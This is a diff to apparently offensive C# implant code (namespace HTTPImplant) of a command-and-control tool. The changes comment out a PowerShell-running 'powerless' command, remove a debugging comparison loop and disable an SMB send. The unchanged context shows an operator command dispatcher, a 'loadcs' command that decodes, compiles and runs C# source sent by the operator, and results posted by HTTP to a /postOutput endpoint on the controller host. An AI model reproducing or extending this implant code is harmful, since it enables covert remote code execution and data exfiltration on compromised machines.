@@ -193,13 +193,13 @@ namespace HTTPImplant
                                         await SendResult(webClient, implantId, command.Operator, outputScreen, SMB);
                                         break;
 
-                                    case "powerless":
+                                    /*case "powerless":
                                         string outputPowerless = Powerless.Exec("Get-Process");
                                         Console.WriteLine(outputPowerless);
                                         string outputBase64Powerless = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputPowerless));
                                         Console.WriteLine(outputBase64Powerless);
                                         await SendResult(webClient, implantId, command.Operator, outputPowerless, SMB);
-                                        break;
+                                        break;*/
 
                                     case "loadcs":
                                         Console.WriteLine("Attempting to Compile and Run .NET C# Code...");
@@ -215,21 +215,6 @@ namespace HTTPImplant
                                             string decodedSourceCode = Encoding.UTF8.GetString(code);
 
                                             Console.WriteLine("Decoded Source Code: \n" + decodedSourceCode);
-
-                                            // Compare the strings character by character
-                                            for (int i = 0; i < Math.Min(sourceCode.Length, decodedSourceCode.Length); i++)
-                                            {
-                                                if (sourceCode[i] != decodedSourceCode[i])
-                                                {
-                                                    Console.WriteLine($"Difference at position {i}: '{sourceCode[i]}' != '{decodedSourceCode[i]}'");
-                                                    break;
-                                                }
-                                            }
-
-                                            if (sourceCode.Length != decodedSourceCode.Length)
-                                            {
-                                                Console.WriteLine($"Length mismatch: sourceCode Length = {sourceCode.Length}, decodedSourceCode Length = {decodedSourceCode.Length}");
-                                            }
 
                                             CompileAndRunNET.ExecuteCS(decodedSourceCode);
                                         }
@@ -279,7 +264,7 @@ namespace HTTPImplant
                 await webClient.UploadStringTaskAsync(new Uri("http://" + host + ":" + port + "/postOutput"), "POST", data);
             } else
             {
-                SMBClient.SendData(data);
+                /*SMBClient.SendData(data);*/
             }
         }
 
